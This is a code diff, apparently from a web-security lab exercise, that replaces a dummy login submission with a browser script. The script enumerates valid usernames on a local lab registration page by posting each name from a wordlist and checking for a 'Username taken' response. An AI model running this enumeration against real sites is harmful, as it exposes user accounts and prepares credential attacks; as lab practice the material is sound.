@@ -150,9 +150,36 @@ callum`.split('\n');
 const form = document.getElementsByName('login')[0];
 const usernameField = document.getElementsByName('username')[0];
 const passwordField = document.getElementsByName('password')[0];
+const correctUsernames = [];
+url = 'http://192.168.64.3/Decamp/Chapter6/lab1/registration.php';
 
-usernameField.value = 'aaaaa';
-passwordField.value = 'bbbbb';
+for (let i = 0; i < usernames.length; i++) {
+  fd = new FormData();
 
-const submitFormFunction = Object.getPrototypeOf(form).submit;
-submitFormFunction.call(form);
+  data = {
+    username: usernames[i],
+    email: 'dummy@email.com',
+    password: 'dummypassword',
+    submit: 'Login',
+  };
+
+  for (const [name, value] of Object.entries(data)) {
+    fd.append(name, value);
+  }
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      body: fd,
+    });
+
+    const responseData = await response.text();
+    if (responseData.includes('Username taken')) {
+      correctUsernames.push(usernames[i]);
+    } else {
+      console.log('.');
+    }
+  } catch (error) {
+    console.error(error);
+  }
+}
